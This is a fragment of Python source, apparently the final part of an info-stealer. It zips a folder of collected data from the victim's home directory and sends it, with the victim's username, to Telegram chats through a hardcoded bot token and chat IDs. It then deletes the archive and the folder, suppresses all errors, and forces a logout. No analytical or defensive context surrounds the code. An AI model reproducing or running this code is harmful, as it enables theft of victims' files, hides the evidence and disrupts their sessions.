    except Exception as e:
        pass
    
async def send_zip_to_user(zip_filepath, bot_token, user_id):
    bot = Bot(token=bot_token)

    try:
        user_name = getuser()  
        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
        await bot.send_message(chat_id=user_id, text=user_message)

        with open(zip_filepath, 'rb') as zip_file:
            await bot.send_document(chat_id=user_id, document=InputFile(zip_file))

        separator_message = "═════════════════"
        await bot.send_message(chat_id=user_id, text=separator_message)

    except Exception as e:
        pass
    
async def main():
    u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")

    zip_filepath = create_zip(u_folder)

    BOT_TOKEN = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
    CHAT_ID = -1001933102780
    USER_TLG_ID = 1972505293

    if zip_filepath:
        await send_zip_to_telegram(zip_filepath, BOT_TOKEN, CHAT_ID)
        await send_zip_to_user(zip_filepath, BOT_TOKEN, USER_TLG_ID)

        os.remove(zip_filepath)

if __name__ == "__main__":
    asyncio.run(main())

def delete():
    u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")

    try:
        shutil.rmtree(u_folder)
    except FileNotFoundError:
        pass
    except Exception as e:
        pass
delete()

def logout():
    return os.system('shutdown -l')
logout()
